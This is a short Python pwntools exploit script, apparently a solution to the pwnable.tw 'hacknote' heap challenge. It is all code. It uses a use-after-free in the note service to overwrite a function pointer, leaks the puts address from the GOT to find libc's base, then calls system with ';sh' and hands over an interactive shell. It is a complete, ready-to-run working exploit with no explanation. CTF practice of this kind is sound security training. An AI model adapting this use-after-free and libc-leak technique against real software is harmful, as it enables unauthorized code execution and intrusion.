from pwn import *

r = remote('chall.pwnable.tw', 10102)

def addNote(size, note):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(note)

def deleteNote(index):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(index))
 
def printNote(index):
    s = r.recvuntil(':')
    r.sendline('3')
    s = r.recvuntil(':')
    r.sendline(str(index))

print_note = 0x804862b
puts_got = 0x804a024
puts_libc = 0x0005f140
system_libc = 0x0003a940

addNote(0x50, 'aaaaa')
addNote(0x50, 'aaaaa')
deleteNote(0)
deleteNote(1)

addNote(0x8, p32(print_note) + p32(puts_got))

printNote(0)

s = r.recvuntil('\n')[:-1].split(':')[1][:4]
puts = u32(s.ljust(4, '\x00'))
print hex(puts)

base = puts - puts_libc
system = base + system_libc

deleteNote(2)

addNote(0x8, p32(system) + ';sh')

printNote(0)

r.interactive()
